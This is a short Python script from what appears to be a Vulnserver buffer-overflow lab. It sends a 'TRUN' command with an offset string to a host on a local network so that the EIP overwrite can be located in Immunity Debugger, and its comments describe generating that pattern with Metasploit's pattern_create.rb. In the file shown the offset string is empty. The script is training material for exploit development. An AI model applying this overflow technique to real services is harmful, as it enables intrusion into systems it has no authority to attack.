#!/usr/bin/python3

import sys, socket
from time import sleep

# Script 1.py will tell roughly how many bytes it took to send to the vulnerable app function before it crashed
# This offset was generated /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
# -l = length
# The length of 2500 was chosen because every time I ran 1.py I was getting returns of between 2300 and 2400 so I rounded up to 2500 to generate the offset
# Immunity debugger and vulnserver attached and run this script will then give you the value of the EIP in vulnserver
# This version changes -l to 3000

offset = ""


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.38',9999))
    payload = "TRUN /.:/" + offset
    s.send((payload.encode()))
    s.close

except:
    print ("Error connecting to server")
    sys.exit()
